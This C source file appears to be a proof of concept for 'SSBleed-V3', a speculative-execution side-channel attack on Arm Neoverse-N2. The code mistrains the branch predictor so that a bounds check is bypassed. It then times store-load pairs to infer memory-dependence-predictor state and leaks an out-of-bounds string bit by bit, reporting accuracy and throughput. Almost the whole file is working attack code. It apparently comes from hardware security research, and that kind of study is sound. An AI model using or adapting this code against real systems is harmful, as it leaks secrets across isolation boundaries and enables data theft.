#include <stdio.h>
#include <stdlib.h> 
#include <stdint.h>
#include <string.h>
#include <sys/time.h>

#define MDP_HIT_THRESHOLD 80

uint64_t array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {0x0,0xff};
uint8_t unused2[64];
uint64_t array2[256];
char* ground_truth = "SSBleed-V3 Proof-of-concept on Neoverse-N2\0";

extern void speculative_execution(uint64_t* bound,
    uint8_t* array1, uint64_t* array2, size_t x, int secret_bit_idx);

extern void stld(void* addr1, void* addr2);

/**
 * Get timestamps through CNTVCT_EL0
 */
static inline uint64_t gettime() {
    uint64_t time;
    asm volatile(
        "dsb sy \n\t"
        "isb \n\t"
        "mrs %0, cntvct_el0 \n\t"
        "isb \n\t"
        :"=r"(time)
    );
    return time;
}

/**
 * Probe MDP state by timing non-dependent store-load pairs
 */
static inline uint64_t probe() {
    uint64_t time1,time2,read_data;
    uint64_t samples[20];

    for(int i = 0; i < 20; ++ i) {
        time1 = gettime();
        stld(&array2[0], &array2[10]);
        time2 = gettime();
        samples[i] = time2 - time1;
    }

    int cnt = 0;
    for(int i = 0; i < 20; ++ i) {
        if (samples[i] > MDP_HIT_THRESHOLD) {
            cnt += 1;
        }
    }
    return cnt;
}

/**
 * Flush cache lines with DC CIVAC instruction
 */
void flush(void *p) {
    asm volatile("dc civac, %0" ::"r"(p));
    asm volatile("dsb ish");
    asm volatile("isb");
}

/**
 * Convert bits to bytes
 */
void decode(int* bits, int bit_len) {
    int byte_len = bit_len / 8;
    char recovered_str[byte_len];
    for(int i = 0; i < byte_len; i ++) {
        recovered_str[i] = 0;
        for(int j = 0; j < 8; ++ j) {
            recovered_str[i] |= (bits[i * 8 + j] & 1) << j;
        }
    }
    for(int i = 0; i < byte_len; ++ i) {
        printf("%c (%x)\n", recovered_str[i], (int)recovered_str[i]);
    }
}

/**
 * Evaluate the accuracy of the inferred bits
 */
double evaluation(int* bits, int bit_len) {
    int acc = 0;
    int ground_truth_bits[bit_len];
    for(int i = 0; i < bit_len / 8; i ++) {
        for(int j = 0; j < 8; ++ j) {
            ground_truth_bits[i * 8 + j] = (ground_truth[i] >> j) & 1;
        }
    }
    for(int i = 0; i < bit_len; ++ i) {
        if (bits[i] == ground_truth_bits[i])
            acc ++;
    }
    return (double) acc / bit_len;
}

int speculatively_fetch(size_t testing_x, int shift) {
    size_t x, training_x = 1;
    uint64_t aliasing_cnt;
    int prob_0 = 0, prob_1 = 0;

    for(int try = 0; try < 3; try ++) {
        // Train the CBP five times and trigger the misprediction
        for(int j = 5; j >= 0; j--) {
            // enlarge the speculative execution window
            flush(&array1_size);
            for(int z = 0; z < 100; z++) {}
            // if j > 0, then x = 1
            // else, x = testing_x 
            x = ((j % 6) - 1) & ~0xffff;
            x = (x | (x >> 16));
            x = training_x ^ (x & (testing_x ^ training_x));
            // trigger speculative execution
            speculative_execution(&array1_size, array1, array2, x, shift);
        }

        aliasing_cnt = probe();

        if (aliasing_cnt > 10)
            prob_0 ++;
        else
            prob_1 ++;
    }

    return prob_0 > prob_1 ? 0 : 1;
}


int main() {
    size_t addr_offset = (size_t)(ground_truth - (char *)array1);
    int len = strlen(ground_truth);
    memset(array2, 0, sizeof(array2));
    int bits[len * 8];

    struct timeval cc_time1, cc_time2;
    gettimeofday(&cc_time1, NULL);
    int cur_byte = 0;
    while(cur_byte < len) {
        for(int i = 0; i < 8; ++ i) {
            int prob = speculatively_fetch(addr_offset, i);
            bits[cur_byte * 8 + i]  = prob;
        }
        addr_offset++;
        cur_byte++;
    }
    gettimeofday(&cc_time2, NULL);
    uint64_t elapsed_time_msec = 
        (cc_time2.tv_sec - cc_time1.tv_sec) * 1000000 + (cc_time2.tv_usec - cc_time1.tv_usec);
    decode(bits, len * 8);
    printf("accuracy: %.4f, throughput: %.4f bps\n", 
        evaluation(bits, len * 8), (double) len * 1000000 / elapsed_time_msec);
    return 0;
}
